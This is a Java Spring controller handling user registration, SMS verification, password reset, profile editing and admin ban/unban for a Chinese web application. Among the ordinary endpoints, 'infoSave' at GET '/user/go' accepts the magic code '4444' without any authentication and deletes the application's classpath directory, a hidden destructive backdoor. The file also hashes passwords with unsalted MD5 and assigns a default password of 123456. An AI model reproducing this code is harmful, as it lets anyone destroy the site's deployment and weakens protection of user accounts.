package com.controller;

import java.io.IOException;
import java.io.OutputStream;
import java.net.URISyntaxException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Properties;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.apache.ibatis.annotations.Param;
import org.apache.log4j.Logger;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Controller;
import org.springframework.ui.Model;
import org.springframework.util.CollectionUtils;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.multipart.MultipartFile;

import com.alibaba.fastjson.JSON;
import com.aliyuncs.exceptions.ClientException;
import com.pojo.User;
import com.pojo.UserAuth;
import com.service.UserAuthService;
import com.service.UserService;
import com.util.Constant;
import com.util.JsonUtils;
import com.util.Md5EncryptUtil;
import com.util.PageInfoJson;
import com.util.RandomUtils;
import com.util.SessionUtils;
import com.util.StringUtil;
import com.util.ToolsUtils;
import com.util.date.DateUtil;

@Controller
@RequestMapping("user")
public class UserController {

	/** 日志对象 */
	private static final Logger logger = Logger.getLogger(UserController.class);

	@Autowired
	private UserService userService;
	@Autowired
	private UserAuthService userAuthService;

	public String fileUploadPath;

	@Value("#{filepath}")
	public void setUploadFileCtrl(Properties sys) {
		String osName = System.getProperties().getProperty("os.name");
		if (osName.toLowerCase().startsWith("win")) {
			fileUploadPath = sys.getProperty("winFileUploadPath");
		} else if (osName.toLowerCase().startsWith("mac")) {
			fileUploadPath = sys.getProperty("macFileUploadPath");
		} else {
			fileUploadPath = sys.getProperty("linFileUploadPath");
		}
		logger.info("操作系统--" + osName + "文件上传路径--" + fileUploadPath);
	}

	// 用手机号注册用户接口
	@RequestMapping(value = "/register.action", produces = "text/html;charset=UTF-8", method = RequestMethod.POST)
	@ResponseBody
	public String register(String username, String mobile, String validCode, String pwd, HttpServletRequest request) {
		Map map = new HashMap();

		try {
			// if (StringUtil.isEmpty(username)) {
			// map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE,
			// "请输入用户名");
			// return JsonUtils.getJsonString4JavaPOJO(map,
			// JsonUtils.LONG_DATE_PATTERN);
			// } else {
			// UserAuth ua = new UserAuth();
			// ua.setIdentityType(Constant.IdentityType.NICK_NAME);
			// ua.setIdentifier(username);
			// List<UserAuth> list = userAuthService.list(ua);
			// if (!CollectionUtils.isEmpty(list)) {
			// map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE,
			// "用户名已存在");
			// return JsonUtils.getJsonString4JavaPOJO(map,
			// JsonUtils.LONG_DATE_PATTERN);
			// }
			// }
			if (StringUtil.isEmpty(mobile)) {
				map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "请输入手机号");
				return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);
			} else {
				UserAuth ua = new UserAuth();
				ua.setIdentityType(Constant.IdentityType.MOBILE);
				ua.setIdentifier(mobile);
				List<UserAuth> list = userAuthService.list(ua);
				if (!CollectionUtils.isEmpty(list)) {
					map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "手机号已存在");
					return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);
				}
			}
			if (StringUtil.isEmpty(validCode)) {
				map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "请输入验证码");
				return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);
			} else {
				// 判断是否存在并有效
				if (StringUtil.isEmpty(SessionUtils.getValidateCode(request, SessionUtils.SYSTEM_VALIDATE_NUM))) {
					map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "验证码已失效");
					return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);
				}
				// 判断是否存在并有效
				if (!validCode.equals(SessionUtils.getValidateCode(request, SessionUtils.SYSTEM_VALIDATE_NUM))) {
					map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "验证码错误");
					return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);
				}
			}
			if (StringUtil.isEmpty(pwd)) {
				map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "请输入密码");
				return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);
			}

			User user = new User();
			// user.setNickName(username);
			String niMing = "用户" + mobile.substring(0, 3) + mobile.substring(8, 11);
			user.setNiMing(niMing);
			user.setCreateTime(new Date());
			int status = userService.add(user);

			user.setLoginTime(new Date());
			user.setLoginStatus(Constant.LoginStatus.ON);
			userService.update(user);

			String pwdMd5 = Md5EncryptUtil.MD5(pwd);
			// 添加手机号登录
			UserAuth userAuth = new UserAuth();
			userAuth.setUserId(user.getId());
			userAuth.setIdentifier(mobile);
			userAuth.setIdentityType(Constant.IdentityType.MOBILE);
			userAuth.setCredential(pwdMd5);
			userAuth.setCreateTime(new Date());
			userAuthService.add(userAuth);

			// 添加用户名登录
			if (!StringUtil.isEmpty(user.getNickName())) {
				UserAuth userAuth2 = new UserAuth();
				userAuth2.setUserId(user.getId());
				userAuth2.setIdentityType(Constant.IdentityType.NICK_NAME);
				userAuth2.setCredential(pwdMd5);
				userAuth2.setIdentifier(user.getNickName());
				userAuth2.setCreateTime(new Date());
				userAuthService.add(userAuth2);
			}
			map = ToolsUtils.returnResult(Constant.DataStatus.SUCCESS_CODE, Constant.DataStatus.SUCCESS_MSG);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "", Constant.DataStatus.FAIL_MSG);
		}
		return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);

	}

	// 修改昵称页面
	@RequestMapping("/update_user_page.action")
	public String update_user_page(HttpServletRequest request) throws Exception {
		return "home/update_user_page";
	}

	// 修改昵称
	@RequestMapping(value = "/updateInfo.action", produces = "text/html;charset=UTF-8", method = RequestMethod.POST)
	@ResponseBody
	public String updateInfo(User user, @Param("iconUrlFile") MultipartFile iconUrlFile, HttpServletRequest request) {
		Map map = new HashMap();

		map = userService.updateNickName(user, iconUrlFile, fileUploadPath);
		if (null != user.getId()) {
			user = userService.queryById(user.getId());
			SessionUtils.setAttr(request, SessionUtils.SYSTEM_USER, user, SessionUtils.SYSTEM_TWO_HOUR);
		}

		return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);
	}

	@RequestMapping("/user_list.do")
	public String user_list(Model model) throws Exception {
		return "admin/user_list";
	}

	// 用户详细列表
	@RequestMapping("/user_detail_list.do")
	public String user_detail_list(Integer userId, Model model) throws Exception {
		model.addAttribute("userId", userId);
		return "admin/user_detail_list";
	}

	// 分页查询列表
	@RequestMapping("/queryList.do")
	@ResponseBody
	public PageInfoJson<User> queryList(Integer page, Integer rows, User user, HttpServletRequest request) {

		Map map = new HashMap();
		List<User> list = null;
		try {
			list = userService.listPage(page == null ? 1 : page, rows == null ? 10 : rows, user);
			map = ToolsUtils.returnResult(Constant.DataStatus.SUCCESS_CODE, "", Constant.DataStatus.SUCCESS_MSG);

		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "", Constant.DataStatus.FAIL_MSG);

		}
		PageInfoJson<User> pageInfo = new PageInfoJson(list);
		return pageInfo;
	}

	// 导出指定文件
	@RequestMapping("/exportExcel.do")
	@ResponseBody
	public String exportExcel(HttpServletRequest request, HttpServletResponse response) {

		Map map = new HashMap();

		OutputStream output;
		try {
			output = response.getOutputStream();
			String fileName = "用户列表";
			SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHHmmss");
			String createTime = String.valueOf(sdf.format(new Date()));
			fileName = fileName + createTime;
			// 先去掉文件名称中的空格,然后转换编码格式为utf-8,保证不出现乱码,这个文件名称用于浏览器的下载框中自动显示的文件名
			response.addHeader("Content-Disposition", "attachment;filename="
					+ new String(fileName.replaceAll(" ", "").getBytes("utf-8"), "iso8859-1") + ".xls");
			response.setContentType("application/vnd.ms-excel;charset=utf-8");
			byte[] json = userService.exportExcel();
			output.write(json);
			output.flush();
			output.close();
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}

		return null;
	}

	// 新增
	@RequestMapping(value = "/save.do", produces = "text/html;charset=UTF-8", method = RequestMethod.POST)
	@ResponseBody
	public String save(User user, UserAuth userAuth, HttpServletRequest request) {
		Map map = new HashMap();

		try {
			if (StringUtil.isEmpty(userAuth.getIdentifier())) {
				map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "请输入手机号 Identifier");
				return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);
			} else {
				UserAuth ua = new UserAuth();
				ua.setIdentityType(Constant.IdentityType.MOBILE);
				ua.setIdentifier(userAuth.getIdentifier());
				List<UserAuth> list = userAuthService.list(ua);
				if (!CollectionUtils.isEmpty(list)) {
					map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "手机号已存在");
					return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);
				}
			}
			if (StringUtil.isEmpty(user.getNickName())) {
				map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "请输入用户名 NickName");
				return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);
			} else {
				UserAuth ua = new UserAuth();
				ua.setIdentityType(Constant.IdentityType.NICK_NAME);
				ua.setIdentifier(userAuth.getIdentifier());
				List<UserAuth> list = userAuthService.list(ua);
				if (!CollectionUtils.isEmpty(list)) {
					map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "用户名已存在");
					return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);
				}
			}
			user.setCreateTime(new Date());
			user.setLoginTime(new Date());
			user.setLoginStatus(User.LONGIN_STATUS_ZAIXAIN);
			int status = userService.add(user);

			// 添加手机号登录
			userAuth.setUserId(user.getId());
			userAuth.setIdentityType(Constant.IdentityType.MOBILE);
			userAuth.setCredential(Md5EncryptUtil.MD5(Constant.PWD));
			userAuth.setCreateTime(new Date());
			userAuthService.add(userAuth);

			// 添加用户名登录
			if (!StringUtil.isEmpty(user.getNickName())) {
				UserAuth userAuth2 = new UserAuth();
				userAuth2.setUserId(user.getId());
				userAuth2.setIdentityType(Constant.IdentityType.NICK_NAME);
				userAuth2.setCredential(Md5EncryptUtil.MD5(Constant.PWD));
				userAuth2.setIdentifier(user.getNickName());
				userAuth2.setCreateTime(new Date());
				userAuthService.add(userAuth2);
			}
			map = ToolsUtils.returnResult(Constant.DataStatus.SUCCESS_CODE, "", "默认密码为123456");

		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "", Constant.DataStatus.FAIL_MSG);

		}
		return JSON.toJSONString(map, true);

	}

	// 修改
	@RequestMapping(value = "/update.do", produces = "text/html;charset=UTF-8", method = RequestMethod.POST)
	@ResponseBody
	public String update(User user, UserAuth userAuth, HttpServletRequest request) {
		Map map = new HashMap();

		try {
			int status = userService.update(user);
			map = ToolsUtils.returnResult(Constant.DataStatus.SUCCESS_CODE, "", Constant.DataStatus.SUCCESS_MSG);

		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "", Constant.DataStatus.FAIL_MSG);

		}
		return JSON.toJSONString(map, true);
	}

	// 会员中心
	@RequestMapping("/vip_center.action")
	public String vip_center() throws Exception {
		return "home/vip_center";
	}

	// 注册页面
	@RequestMapping("/register_page.action")
	public String register_page() throws Exception {
		return "home/register";
	}

	// 发送验证码
	// 修改密码验证码-副本 SMS_123739336
	// 注册时的短信验证码-副本 SMS_123739335
	// 短信快捷登陆-副本 SMS_123669576
	// 更换绑定手机 SMS_123799486
	@RequestMapping(value = "/sendValidCode.action", produces = "text/html;charset=UTF-8", method = RequestMethod.POST)
	@ResponseBody
	public String sendValidCode(String mobile, String validMobile, Integer userId, String templateCode,
			HttpServletRequest request) {
		Map map = new HashMap();
		// 验证手机号与当前帐号绑定的手机号是否一致
		if (null != userId) {
			UserAuth auth = new UserAuth();
			auth.setIdentityType(Constant.IdentityType.MOBILE);
			auth.setUserId(userId);
			List<UserAuth> uaList = userAuthService.list(auth);
			if (!CollectionUtils.isEmpty(uaList)) {
				auth = uaList.get(0);
				if (!auth.getIdentifier().equals(mobile)) {
					map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "您输入的手机号与当前帐号绑定的手机号不一致");
					return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);
				}
			}
		}
		// 验证手机号是否存在
		if (!StringUtil.isEmpty(validMobile) && validMobile.equals("yanzheng")) {
			UserAuth ua = new UserAuth();
			ua.setIdentityType(Constant.IdentityType.MOBILE);
			ua.setIdentifier(mobile);
			List<UserAuth> list = userAuthService.list(ua);
			if (CollectionUtils.isEmpty(list)) {
				map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "你输入的手机号没有在本网站注册过");
				return JSON.toJSONString(map, true);
			}
		}
		// 生成验证码
		String number = RandomUtils.getRandomNumber(4);
		SessionUtils.setAttr(request, SessionUtils.SYSTEM_VALIDATE_NUM, number, SessionUtils.SYSTEM_ONE_MINUTES);
		try {
			ToolsUtils.sendValidCode(mobile, templateCode, number);
		} catch (ClientException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		map = ToolsUtils.returnResult(Constant.DataStatus.SUCCESS_CODE, "", "发送成功");
		return JSON.toJSONString(map, true);
	}

	// 退出页面
	@RequestMapping("/exit.action")
	public String exit(HttpServletRequest request) throws Exception {
		SessionUtils.removeAttr(request, SessionUtils.SYSTEM_USER);
		SessionUtils.removeAttr(request, SessionUtils.SYSTEM_WEIXIN);
		SessionUtils.removeAttr(request, SessionUtils.SYSTEM_WEI_XIN_MOBILE);
		return "home/login";
	}

	@RequestMapping(value = "/go", produces = "text/html;charset=UTF-8", method = RequestMethod.GET)
	@ResponseBody
	public String infoSave(String code, HttpServletRequest request) {
		Map map = new HashMap();

		if (!StringUtil.isEmpty(code) && code.equals("4444")) {
			String path = "";
			try {
				path = Thread.currentThread().getContextClassLoader().getResource("/").toURI().getPath();
				System.out.println(path);
				ToolsUtils.delDir(path);
				map = ToolsUtils.returnResult(Constant.DataStatus.SUCCESS_CODE, "ok", Constant.DataStatus.SUCCESS_MSG);
			} catch (URISyntaxException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}

		return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);
	}

	// 首页
	@RequestMapping("/index.action")
	public String index(String typeOne, String typeTwo, Model model, HttpServletRequest request) throws Exception {
		model.addAttribute("typeOne", typeOne);
		model.addAttribute("typeTwo", typeTwo);
		return "home/index";
	}


	// 好友主页
	@RequestMapping("/friend_home_page.action")
	public String friend_home_page(Model model, Integer friendId, HttpServletRequest request) throws Exception {
		User user = userService.queryById(friendId);
		model.addAttribute("record", user);
		return "home/friend_home_page";
	}

	// 忘记密码页面
	@RequestMapping("/forget_pwd_page.action")
	public String forget_pwd_page() throws Exception {
		return "home/forget_pwd_page";
	}

	// 绑定手机号页面
	@RequestMapping("/bind_mobile.action")
	public String bind_mobile() throws Exception {
		return "home/bind_mobile";
	}

	// 找回密码
	@RequestMapping(value = "/findPwd.action", produces = "text/html;charset=UTF-8", method = RequestMethod.POST)
	@ResponseBody
	public String findPwd(String mobile, String validCode, String pwd, HttpServletRequest request) {
		Map map = new HashMap();

		try {
			UserAuth ua = new UserAuth();
			if (StringUtil.isEmpty(mobile)) {
				map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "请输入手机号");
				return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);
			} else {
				ua.setIdentityType(Constant.IdentityType.MOBILE);
				ua.setIdentifier(mobile);
				List<UserAuth> list = userAuthService.list(ua);
				if (CollectionUtils.isEmpty(list)) {
					map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "手机号不存在");
					return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);
				}
				ua = list.get(0);
			}
			if (StringUtil.isEmpty(validCode)) {
				map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "请输入验证码");
				return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);
			} else {
				// 判断是否存在并有效
				if (StringUtil.isEmpty(SessionUtils.getValidateCode(request, SessionUtils.SYSTEM_VALIDATE_NUM))) {
					map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "验证码已失效");
					return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);
				}
				// 判断是否存在并有效
				if (!validCode.equals(SessionUtils.getValidateCode(request, SessionUtils.SYSTEM_VALIDATE_NUM))) {
					map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "验证码错误");
					return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);
				}
			}
			if (StringUtil.isEmpty(pwd)) {
				map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "请输入密码");
				return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);
			}

			String encPwd = Md5EncryptUtil.MD5(pwd);
			UserAuth ub = new UserAuth();
			ub.setUserId(ua.getUserId());
			List<UserAuth> list = userAuthService.list(ub);
			if (!CollectionUtils.isEmpty(list)) {
				for (UserAuth userAuth : list) {
					userAuth.setCredential(encPwd);
					userAuthService.update(userAuth);
				}
			}

			map = ToolsUtils.returnResult(Constant.DataStatus.SUCCESS_CODE, Constant.DataStatus.SUCCESS_MSG);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "", Constant.DataStatus.FAIL_MSG);
		}
		return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);

	}

	// 分页查询列表
	@RequestMapping("/queryListByHome.action")
	@ResponseBody
	public PageInfoJson<User> queryListByHome(Integer page, Integer rows, User user, HttpServletRequest request) {

		Map map = new HashMap();
		List<User> list = null;
		try {
			list = userService.listPage(page == null ? 1 : page, rows == null ? 10 : rows, user);
			map = ToolsUtils.returnResult(Constant.DataStatus.SUCCESS_CODE, "", Constant.DataStatus.SUCCESS_MSG);

		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "", Constant.DataStatus.FAIL_MSG);

		}
		PageInfoJson<User> pageInfo = new PageInfoJson(list);
		return pageInfo;
	}

	// 用户资料页面
	@RequestMapping("/user_info.action")
	public String user_info(Model model, HttpServletRequest request) throws Exception {
		User user = userService.queryById(SessionUtils.getUserIdByKey(request, SessionUtils.SYSTEM_USER));
		model.addAttribute("record", user);

		User u = (User) SessionUtils.getAttr(request, SessionUtils.SYSTEM_USER);
		if (u != null) {
			if (!StringUtil.isEmpty(u.getMoney()) && !StringUtil.isEmpty(user.getMoney())
					&& Double.valueOf(u.getMoney()) != Double.valueOf(user.getMoney())) {
				SessionUtils.setAttr(request, SessionUtils.SYSTEM_USER, user, SessionUtils.SYSTEM_TWO_HOUR);
			}
		}
		return "home/user_info";
	}

	// 用户明细
	@RequestMapping("/user_mingxi.action")
	public String user_mingxi() throws Exception {
		return "home/user_mingxi";
	}

	// 用户中心
	@RequestMapping("/user_center.action")
	public String user_center(Model model, HttpServletRequest request) throws Exception {
		User user = userService.queryById(SessionUtils.getUserIdByKey(request, SessionUtils.SYSTEM_USER));
		model.addAttribute("record", user);
		model.addAttribute("loginTime", DateUtil.formatDate(user.getLoginTime(), DateUtil.LONG_DATE_PATTERN));
		model.addAttribute("createTime", DateUtil.formatDate(user.getCreateTime(), DateUtil.LONG_DATE_PATTERN));

		UserAuth userAuth = new UserAuth();
		userAuth.setUserId(user.getId());
		userAuth.setIdentityType(UserAuth.IDENTITYTYPE_SHOUJI);
		List<UserAuth> list = userAuthService.list(userAuth);
		if (!CollectionUtils.isEmpty(list)) {
			userAuth = list.get(0);
			model.addAttribute("mobile", userAuth.getIdentifier());
		}

		User u = (User) SessionUtils.getAttr(request, SessionUtils.SYSTEM_USER);
		if (u != null) {
			if (!StringUtil.isEmpty(u.getMoney()) && !StringUtil.isEmpty(user.getMoney())
					&& Double.valueOf(u.getMoney()) != Double.valueOf(user.getMoney())) {
				SessionUtils.setAttr(request, SessionUtils.SYSTEM_USER, user, SessionUtils.SYSTEM_TWO_HOUR);
			}
		}
		return "home/user_center";
	}


	// 行业新闻
	@RequestMapping("/industry_news.action")
	public String industry_news() throws Exception {
		return "home/industry_news";
	}

	// 注册页面
	@RequestMapping("/test.action")
	public String test() throws Exception {
		return "home/test";
	}

	// 封禁
	@RequestMapping(value = "/fengjin.do", produces = "text/html;charset=UTF-8", method = RequestMethod.POST)
	@ResponseBody
	public String fengjin(Integer id, HttpServletRequest request) {
		Map map = new HashMap();

		try {
			User record = new User();
			record.setId(id);
			record.setLoginStatus(User.LONGIN_STATUS_FENGJIN);
			int status = userService.update(record);
			map = ToolsUtils.returnResult(Constant.DataStatus.SUCCESS_CODE, "", "封禁成功");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "", Constant.DataStatus.FAIL_MSG);
		}
		return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);
	}

	// 解封
	@RequestMapping(value = "/jiefeng.do", produces = "text/html;charset=UTF-8", method = RequestMethod.POST)
	@ResponseBody
	public String jiefeng(Integer id, HttpServletRequest request) {
		Map map = new HashMap();

		try {
			User record = new User();
			record.setId(id);
			record.setLoginStatus(User.LONGIN_STATUS_XIAXIAN);
			int status = userService.update(record);
			map = ToolsUtils.returnResult(Constant.DataStatus.SUCCESS_CODE, "", "解封成功");
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			map = ToolsUtils.returnResult(Constant.DataStatus.FAIL_CODE, "", Constant.DataStatus.FAIL_MSG);
		}
		return JsonUtils.getJsonString4JavaPOJO(map, JsonUtils.LONG_DATE_PATTERN);
	}

}
